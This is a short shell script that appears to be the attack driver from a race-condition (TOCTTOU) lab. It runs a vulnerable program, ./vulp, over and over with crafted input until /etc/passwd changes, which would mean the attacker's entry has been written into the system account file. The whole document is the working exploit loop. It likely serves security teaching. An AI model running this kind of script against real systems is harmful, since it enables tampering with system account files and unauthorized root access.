#!/bin/sh
old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    ./vulp < passwd_input
    new=`ls -l /etc/passwd`
done
echo "STOP... The file has been changed"